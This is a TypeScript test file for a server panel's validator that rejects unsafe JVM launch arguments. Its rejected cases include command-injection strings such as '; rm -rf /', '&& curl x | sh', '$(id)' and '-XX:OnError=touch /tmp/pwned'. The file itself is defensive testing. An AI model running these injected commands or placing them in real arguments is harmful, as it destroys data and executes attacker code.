import { describe, expect, test } from "bun:test";
import type { KubekBlueprintManifest } from "@kubekpanel/blueprint-sdk";
import { BadRequestException } from "@nestjs/common";
import { BlueprintResolver } from "./blueprint-resolver.service";
import { paper } from "./bundled/paper";
import {
  assertLaunchVariablesSafe,
  launchVariableKeys,
  unsafeLaunchReason,
} from "./launch-args";

const blueprint: KubekBlueprintManifest = paper;

describe("unsafeLaunchReason", () => {
  test.each([
    "-Xmx4G -XX:+UseG1GC -Dfile.encoding=UTF-8",
    '-Dkey="a b"',
    "-Dkey='a b'",
    '-Dmsg="it\'s fine"',
    "-Xlog:gc*:file=logs/gc-%t.log",
    "-Djava.io.tmpdir=C:\\temp\\mc",
    "-Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true",
    "-XX:+UseZGC -XX:+ZGenerational",
    "",
  ])("allows %p", (value) => {
    expect(unsafeLaunchReason(value)).toBeNull();
  });

  test.each([
    "-Xmx1G; rm -rf /",
    "-Xmx1G && curl x | sh",
    "-Dx=$(id)",
    "-Dx=${HOME}",
    "-Dx=`id`",
    "-Dx=a > /tmp/out",
    "-Dx=a < /etc/passwd",
    "-Dx=(a)",
    "-Xmx1G\nid",
    "-Xmx1G\rid",
    '-Dx="a\\"; id; echo "',
    '-Dx="unterminated',
    "-Dx='unterminated",
    "-XX:OnError=touch /tmp/pwned",
    '-Xmx1G "-XX:OnOutOfMemoryError=id"',
    "-xx:onerror=id",
  ])("rejects %p", (value) => {
    expect(unsafeLaunchReason(value)).not.toBeNull();
  });
});

describe("launch variables", () => {
  test("only keys used in the startup command are checked", () => {
    const keys = launchVariableKeys(blueprint);
    expect(keys).toContain("JVM_ARGS");
    expect(keys).toContain("XMX");
    expect(keys).not.toContain("JAVA_VERSION");
  });

  test("bad stored value fails at start", () => {
    expect(() =>
      assertLaunchVariablesSafe(blueprint, { JVM_ARGS: "-Xmx1G;id" }),
    ).toThrow(/JVM_ARGS/);
    expect(() =>
      assertLaunchVariablesSafe(blueprint, { JVM_ARGS: '-Dkey="a b"' }),
    ).not.toThrow();
  });

  test("validateVariables answers 400 with a code", () => {
    const resolver = new BlueprintResolver();
    let caught: unknown;
    try {
      resolver.validateVariables(blueprint, {
        GAME_VERSION: "1.21.1",
        JVM_ARGS: "-Xmx1G | id",
      });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(BadRequestException);
    expect((caught as BadRequestException).getResponse()).toMatchObject({
      code: "UNSAFE_LAUNCH_ARGUMENT",
    });
    const ok = resolver.validateVariables(blueprint, {
      GAME_VERSION: "1.21.1",
      JVM_ARGS: '-Xmx4G -XX:+UseG1GC -Dfile.encoding=UTF-8 -Dkey="a b"',
    });
    expect(ok.JVM_ARGS).toBe(
      '-Xmx4G -XX:+UseG1GC -Dfile.encoding=UTF-8 -Dkey="a b"',
    );
  });
});
